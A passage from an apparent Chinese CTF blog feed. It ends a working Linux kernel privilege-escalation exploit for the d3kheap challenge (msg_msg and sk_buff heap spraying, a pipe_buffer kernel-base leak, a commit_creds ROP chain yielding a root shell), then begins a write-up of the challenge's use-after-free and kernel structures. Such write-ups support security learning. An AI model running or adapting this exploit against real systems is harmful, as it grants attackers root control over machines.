sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// print_hex(oob_msg.mtext, sizeof(oob_msg.mtext));</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = (kernel_addr - <span class="number">0xffffffff8203fe40</span>);</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_addr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810938f0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff82c6d580</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_cred = <span class="number">0xffffffff810d25c0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00ff0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> push_rsi_pop_rsp_pop_4reg_ret = <span class="number">0xffffffff812dbede</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_pop_4reg_ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_cred;</span><br><span class="line">    rop_chain[rop++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = getShell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220920223946797.png"                      alt="image-20220920223946797"                ></p><hr><p>参考链接：<a class="link"   href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-IV-%E5%A0%86%E5%96%B7-pipe-buffer%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80" >https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-IV-%E5%A0%86%E5%96%B7-pipe-buffer%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80<i class="fas fa-external-link-alt"></i></a></p><p>题目在上一篇文章</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在上一篇文章d3kheap中提到还有另外一种解决办法就是利用这一CVE进行利用，所以这一篇依旧使用d3kheap来进行复现。不过这里首先提一</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="sk_buff" scheme="https://cv196082.gitee.io/tags/sk-buff/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
  </entry>
  
  <entry>
    <title>kernel内存搜索技术</title>
    <link href="https://cv196082.gitee.io/2022/09/16/kernel%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/"/>
    <id>https://cv196082.gitee.io/2022/09/16/kernel%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/</id>
    <published>2022-09-16T14:36:11.000Z</published>
    <updated>2022-09-23T07:14:01.194Z</updated>
    
    <content type="html"><![CDATA[<p>这里作为演示的例题为d3kheap，也是我拖了很久的复现题目，题目链接放在文章末尾。这篇文章使用的方法是作者的预期解的方法，也就是setxattr多次劫持msg_msg泄漏地址，在下一篇文章会记录第二种方法 CVE-2021-22555。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3kheap_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0xDEAD</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a2 &gt; <span class="number">0xDEAD</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1234</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_480);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = (<span class="keyword">void</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">0xCC0</span>LL, <span class="number">1024LL</span>);</span><br><span class="line">        ++ref_count;</span><br><span class="line">        buf = v2;</span><br><span class="line">        printk(&amp;unk_37A);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a2 &gt; <span class="number">0x1233</span> &amp;&amp; ((_DWORD)a2 == <span class="number">0x4321</span> || (_DWORD)a2 == <span class="number">0xBEEF</span>) )</span><br><span class="line">      printk(&amp;unk_3F0);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      LABEL_13:</span><br><span class="line">    printk(&amp;unk_4F8);</span><br><span class="line">    LABEL_5:</span><br><span class="line">    pv_ops[<span class="number">79</span>](&amp;spin);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_4A8);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ref_count )</span><br><span class="line">  &#123;</span><br><span class="line">    --ref_count;</span><br><span class="line">    kfree();</span><br><span class="line">    printk(&amp;unk_394);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  d3kheap_ioctl_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先题目只有create和delete的功能，漏洞点在于ref_count的错误初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ref_count dd <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后就是编译选项的readme文档：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><ol><li>开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）</li><li>开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））</li><li>开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）</li><li>开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）</li></ol><p>所以总的来说题目只存在一个UAF漏洞，除此之外什么都没有了。</p><p>这里不过多的介绍setxattr函数，在前一篇文章有介绍，这里主要内容还是放在这一项技术的实现手法。</p><h2 id="setxattr多次劫持msg-msg实现泄漏"><a href="#setxattr多次劫持msg-msg实现泄漏" class="headerlink" title="setxattr多次劫持msg_msg实现泄漏"></a>setxattr多次劫持msg_msg实现泄漏</h2><h3 id="构造UAF"><a href="#构造UAF" class="headerlink" title="构造UAF"></a>构造UAF</h3><p>首先我们如果是要劫持msg_msg的堆块的话需要他是在free状态，所以我们需要构造出UAF，构造步骤为：</p><ol><li>add()出一个size为1024的堆块</li><li>del()删除刚刚的堆块</li><li>利用msgsnd生成一块1024大小的msg_msg结构体</li><li>最后利用del()删除掉msg_msg结构体所在的堆块</li></ol><p>之后这个堆块虽然对msg_msg来说是正在使用的状态，但是在slub看来是已经被free掉的了。</p><h3 id="msg-msg地址搜索原理"><a href="#msg-msg地址搜索原理" class="headerlink" title="msg_msg地址搜索原理"></a>msg_msg地址搜索原理</h3><p>当我们调用msgget时会创建一个消息队列时，在内核空间中会创建这样一个结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="keyword">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="keyword">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="keyword">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>而当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="keyword">long</span> m_type;</span><br><span class="line"><span class="keyword">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以在内核中这两个结构体会形成如下图所示的双向链表:</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/wjzFeZiDUpxXVKJ.png"                      alt="wjzFeZiDUpxXVKJ"                ></p><p>如果这个消息队列中只存在一个消息则会形成如下链表：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/sD9xtpaHrQ2uneZ.png"                                     ></p><p>接下来深入看一下msg_msg结构体的创建，当我们使用msgsed函数时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">  DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">  ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  msg = load_msg(mtext, msgsz);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>会调用loda_msg函数，而load_msg函数最终会调用alloc_msg函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="keyword">int</span> err = -EFAULT;</span><br><span class="line"><span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br><span class="line">  </span><br><span class="line">  <span 